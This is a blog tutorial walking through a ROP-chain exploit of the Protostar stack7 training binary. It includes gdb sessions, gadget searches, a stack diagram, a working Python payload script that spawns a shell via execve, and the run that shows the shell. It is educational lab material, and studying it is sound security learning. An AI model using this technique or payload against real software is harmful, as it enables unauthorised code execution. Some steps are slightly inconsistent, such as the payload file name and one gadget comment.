---
layout: post
title:  "Rop Gadget Chaining"
image: ''
date:   2017-01-12 13:18:31
tags: 
- exploit
- ROP
- protostar
description: 'Rop Gadget chaining exploit tutorial'
categories:
- Exploitation
serie: learn
comments: true
---

I wanted to post a walkthrough of building a rop chain exploit for anyone trying to learn out there. There are some very good resources out there, but I wanted to try to combine them in an easy to follow manner to do a basic rop chain exploit. I used protostar stack7 binary for this example.


### Lets check out our binary source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);    // takes your input with gets

  ret = __builtin_return_address(0);  // finds return value of function

  if((ret & 0xb0000000) == 0xb0000000) {  // makes sure ret val isnt in this range
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

We can see this is a pretty straightforward overflow via gets() , with some limitations on what the return can be. We will circumvent this by using a rop chain. I will skip the details of getting the input size needed to overflow our return value. You can check that out in my previous [write ups](https://github.com/le91688/protostar "write ups"). We will use 0x50 ;)

### ROP Gadgets---- What exactly are they?

A ROP gadget is basically just the tail end of a function that ends in ret. EXAMPLE:

```nasm
pop $eax;
ret;
```

### What can we do with them?

We can piece together a bunch of ROP gadgets, along with values on our stack to perform just about anything. In my example we will be executing a system call to execve with specific parameters in order to get a shell. After we design our stack with the proper values and rop gadgets, we will be getting a shell via execve.

First things first, we will find our offset and what input we need to overwrite our EIP so that we can jump to a location in memory. Luckily, stack7 is nearly identical to stack6, so we can take the offset from there ( See stack6 write up for walkthrough!) So we have our offset(0x50). Now it's time to formulate a plan and design our stack.

So, our goal is to creat a system call to execve(x,y,z).


### Recommended reading:
[assembly system calls](https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm)


We see that during a system call, EAX is set to a specific value and then INT 0x80(interrupt) to call the kernel. So we need to figure out what value we need to load into EAX for execve.

Notice in the source code, we have

```c
#include <unistd.h>
```

unistd.h is the header file that provides access to the OS API. This means we can examine this header file, and figure out what value will get us EXECVE.

I got snagged here for a bit. I did these challenges on a 64 bit system, so I had a couple of unistd.h's .

```bash
/usr/include/unistd.h
/usr/include/asm/unistd.h
/usr/include/asm/unistd_64.h
/usr/include/asm/unistd_x32.h
/usr/include/asm/unistd_32.h
```

The others check your architecture and point you to correct header, and since our program was compiled for x86, we actually use the following header file: /usr/include/asm/unistd_32.h

```bash
le91688:/usr/include/asm $ cat unistd_32.h | grep "execve"
#define __NR_execve 11
```

So we see that 11 or 0xb is our value we want EAX to be when we call our interrupt. Now that we have our system call figured out, we need to figure out what parameters to pass to it, and what registers to use.

#### Recommended Reading: 
[Demistifying execve](http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html)


Lets check out EXECVE by looking at the man page:

```bash
le91688:$ man execve
EXECVE(2)                                             Linux Programmer's Manual                  EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```

#### filename

The first arg needs to be a pointer to a string that is a path to the binary in our case, a ptr to "/bin/sh"

#### argv[]

The second is the list of args to the program, and since we are not running /bin/sh with any args, we can set this to a null byte

#### envp[]

The third arg is for environment options, again we'll set this to a null byte Our call should look like this:

```
execve('/bin/sh',0,0)
```

So now we know how we need to call execve, now we need to figure out how to do it.

To perform our system call we do the following:

Put the system call number in the EAX register.
Store the arguments to the system call in the registers EBX, ECX, etc.
This means we need our registers set up like this

```nasm
EAX = 0xb (sys call value for execve)
EBX = ptr to "/bin/sh"
ECX = 0x0
EDX = 0x0
```

Now we need to go gather some gadgets to make the magic happen. I used ROPgadget, you can grab it [here](https://github.com/JonathanSalwan/ROPgadget).


NOTE: i realize i'm not using this tool to its fullest potential, but I will show how I was able to grab gadgets, if you have any tips feel free to comment! I also saw the --ROPchain switch, but thats no fun ;)

At first, I tried running ROPgadget on the binary ( ./stack7) itself, and only found ~70 gadgets, but nothing useful. After some professional help (thanks @rotlogix) , I learned that you need to run it on the library itself. We need to find what library is being loaded in memory at runtime:

```bash
le91688:~/workspace/proto (master) $ gdb ./stack7
Reading symbols from ./stack7...done.
gdb$ b main
Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
gdb$ run
Starting program: /home/ubuntu/workspace/proto/stack7 
Breakpoint 1, main (argc=0x1, argv=0xffffd1c4) at stack7/stack7.c:28
gdb$ info sharedlibrary                                             #<<---- get loaded library info
From        To          Syms Read   Shared Object Library
0x55555860  0x5556d76c  Yes (*)     /lib/ld-linux.so.2
0x555a5490  0x556d699e  Yes (*)     /lib/i386-linux-gnu/libc.so.6   #<<------ target library to grab gadgets!
gdb$ quit
```

So now we can run ROPgadget on libc.so.6 and pipe it to a file "LIBCgadgets" I will then grep this for gadgets!

```bash
le91688:~/workspace/proto$ ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 > ./LIBCgadgets
le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
0x0007a1fb : test eax, eax ; jne 0x7a1f6 ; xor eax, eax ; ret
0x00094908 : test eax, eax ; jne 0x94986 ; xor eax, eax ; ret
0x00094937 : test eax, eax ; jne 0x949a6 ; xor eax, eax ; ret
0x0002f4d3 : test ecx, ecx ; je 0x2f4ce ; xor eax, eax ; ret
0x000949bd : xor bl, al ; nop ; xor eax, eax ; ret
0x001466dc : xor byte ptr [edx], al ; add byte ptr [eax], al ; xor eax, eax ; ret
0x0002f0ec : xor eax, eax ; ret
le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
```

Using this i'm able to find the following useful gadgets:

```nasm
0x000f9482  : pop ecx ; pop ebx ; ret       #load values from stack to ECX, EBX
0x00001aa2  : pop edx ; ret                 #load value in EDX
0x001454c6  : add eax, 0xb ; ret            #add 0xb to EAX
0x0002f0ec  : xor eax, eax ; ret            #Zero out EAX
0x0002e725  : int 0x80                      #syscall
```

Now, the memory values for each gadget are the offset within the loaded library, so we need to get the base address of the library when its loaded.

Warning: GDB info sharedlibrary is not a good way to do this and will lead to anger and hatred. Please dont ask me how i know. Instead use the following method. We will also grab the location of "bin/sh" in memory, as done in stack6.

```bash
le91688:~/workspace/proto (master) $ ulimit -s unlimited  <--- DONT FORGET THIS, DISABLE LIBRARY RANDOMIZATION
le91688:~/workspace/proto (master) $ gdb ./stack7
warning: ~/.gdbinit.local: No such file or directory
Reading symbols from ./stack7...done.
gdb$ b main
Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
gdb$ run
Starting program: /home/ubuntu/workspace/proto/stack7 
Breakpoint 1, main (argc=0x1, argv=0xffffd1c4) at stack7/stack7.c:28
warning: Source file is more recent than executable.
28        getpath();
gdb$ p system
$1 = {<text variable, no debug info>} 0x555ce310 <system>
gdb$ find $1, +99999999999, "/bin/sh"
0x556ee84c                                                    <------------- BIN/SH location!
warning: Unable to access 16000 bytes of target memory at 0x5573ca54, halting search.
1 pattern found.
gdb$ shell
le91688:~/workspace/proto$ ps -aux | grep stack7
ubuntu     29655  0.1  0.0  47856 18112 pts/5    S    13:12   0:00 gdb ./stack7
ubuntu     29658  0.0  0.0   2028   556 pts/5    t    13:12   0:00 /home/ubuntu/workspace/proto/stack7
ubuntu     29686  0.0  0.0  10556  1608 pts/5    S+   13:13   0:00 grep --color=auto stack7
le91688:~/workspace/proto (master) $ cat /proc/29658/maps
08048000-08049000 r-xp 00000000 00:245 386                               /home/ubuntu/workspace/proto/stack7
08049000-0804a000 rwxp 00000000 00:245 386                               /home/ubuntu/workspace/proto/stack7
55555000-55575000 r-xp 00000000 00:245 9405                              /lib/i386-linux-gnu/ld-2.19.so
55575000-55576000 r-xp 0001f000 00:245 9405                              /lib/i386-linux-gnu/ld-2.19.so
55576000-55577000 rwxp 00020000 00:245 9405                              /lib/i386-linux-gnu/ld-2.19.so
55577000-55579000 r--p 00000000 00:00 0                                  [vvar]
55579000-5557a000 r-xp 00000000 00:00 0                                  [vdso]
5557a000-5557c000 rwxp 00000000 00:00 0 
5558e000-55736000 r-xp 00000000 00:245 9410   Target------------->       /lib/i386-linux-gnu/libc-2.19.so   
55736000-55737000 ---p 001a8000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
55737000-55739000 r-xp 001a8000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
55739000-5573a000 rwxp 001aa000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
5573a000-5573e000 rwxp 00000000 00:00 0 
fffdd000-ffffe000 rwxp 00000000 00:00 0  
```

So we have can see that our library libc-2.19.so is loaded in memory starting at 0x5558e000 and our binsh pointer value needs to be 0x556ee84c

We are starting to get a pile of info, but I promise it will all come together soon, beautifully! Next, lets design our stack:

```nasm
//higher memory
+----------------------+
|   INT0x80            |  syscall should be "execve( "/bin/sh",0,0)
+----------------------+
|   add eax, 0xb ; ret |  add 0xb to EAX (to call execve with 11)
+----------------------+
|   xor eax,eax ; ret  |  ensure EAX is 0
+----------------------+
|   \x00\x00\x00\x00   |
+----------------------+
|   ptr to "/bin/sh/"  |  
+----------------------+
|pop $ecx,pop $ebx; ret|  load ECX with NULL and EBX with 'bin/sh'
+----------------------+
|  \x00\x00\x00\x00    |
+----------------------+
|   pop $edx, ret      |  load EDX with NULL
+----------------------+
|   EBP = "BBBB"       |  Our overflow
+----------------------+
|   filler A's         |  
---------------------- +
//lower memory
```

Now we can put this all together with python

Python script (ropchain.py):

```python
#!/usr/bin/env python
from struct import pack

lib_base = 0x5558e000              #base of our library

syscall     = lib_base + 0x0002e725
zero_eax    = lib_base + 0x0002f0ec
set_eax     = lib_base + 0x001454c6
pop_ecx_ebx = lib_base + 0x000f9482
pop_edx     = lib_base + 0x00001aa2
binsh_loc   = 0x556ee84c
null_val    = '\x00\x00\x00\x00'

#struct pack returns a string containing values packed in a certain format
#'<I' makes them little endian unsigned int's
#see here for more details https://docs.python.org/2/library/struct.html

p = 'a'*76    #fill buffer          #build our stack
p += 'bbbb'    #overflow ebp
p += pack('<I', pop_edx)    #pop edx; ret
p += null_val               #EDX = 0
p += pack('<I', pop_ecx_ebx)    #pop ecx; ret
p += null_val
p += pack('<I', binsh_loc)
p += pack('<I', zero_eax)
p += pack('<I', set_eax)
p += pack('<I', syscall)

print (p)                          #for simplicity I just printed the value

```

Now we use our cat trick to keep stdin open and get our shell!

winning command:

```bash
le91688:~/workspace/proto (master) $ ulimit -s unlimited   <--- ensure lib randomization is off
le91688:~/workspace/proto$ python ./ropchain.py 
le91688:~/workspace/proto$ (cat testrop; cat) | ./stack7
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXUaaaaaaaabbbbXU
ls
LIBCgadgets             format0          format3    heap4.asm    stack0.s          stack3exploit.py    ...
whoami
ubuntu
```

###Resources:

[CodeArcana ROP](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)

[Exploit DB ROP guide](https://www.exploit-db.com/docs/28479.pdf)

[System Calls](https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm)

[Rotlogix arm exploit](http://rotlogix.com/2016/05/03/arm-exploit-exercises/)


